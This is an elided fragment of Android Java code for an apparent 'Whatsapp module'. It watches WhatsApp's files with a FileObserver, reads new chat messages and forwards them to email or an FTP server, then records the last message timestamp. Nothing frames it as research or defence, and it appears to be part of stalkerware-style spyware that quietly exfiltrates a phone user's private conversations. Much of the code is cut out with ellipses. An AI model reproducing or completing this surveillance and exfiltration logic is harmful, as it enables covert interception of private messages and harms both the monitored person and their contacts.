...
//}
	...
	private synchronized void _getNewChat(){
		...
		//Log.w("Whatsapp module", "getnewchat");
		...
		try {
			...
			if (list != null && list.size() > 0 && networkAvailable())
				...
				if (mSettings.sendSocialToMail())
					{
					res1 = MailNotify.sendSocialToMail(list,2);
					}
				if (mSettings.sendSocialToFTP())
					{
					res2 = FTPNotify.sendSocialToFTP(list,2);
					}
				if (res1 || res2)
					{
					saveLastMsgTimestamp(mLastMsgTimestamp);			
	...
	private class WhatsAppFileObserver extends FileObserver {
		private static final long UPDATE_TIOMEOUT = 5 * 1000L;
		...
		public synchronized void onEvent(int event, String path) {
			...
			//Log.w("Whatsapp module", "event: " + event + "; Path: " + path );
			...
			new Thread(new Runnable() {
				@Override
				public void run() {
					//Log.w("Whatsapp module", "run execute");
					try {
